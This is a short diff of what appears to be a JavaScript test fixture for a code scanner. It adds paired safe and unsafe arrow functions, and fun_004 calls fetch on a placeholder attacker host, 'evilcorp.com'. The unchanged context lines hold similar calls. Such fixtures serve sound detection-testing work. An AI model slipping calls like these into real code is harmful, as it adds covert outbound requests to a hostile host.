@@ -146,6 +146,12 @@ const log_005 = num > 4 ?? fetch('https://evilcorp.com/hackyhacky');
 // fun = function
 const fun_001 = () => 2 + 2;
 const fun_002 = () => fetch('https://evilcorp.com/hackyhacky');
+const fun_003 = () => {
+    return 2+2;
+}
+const fun_004 = () => {
+    return fetch('https://evilcorp.com/hackyhacky');
+}
 
 const fun_009 = function () {
     return 'A safe value';
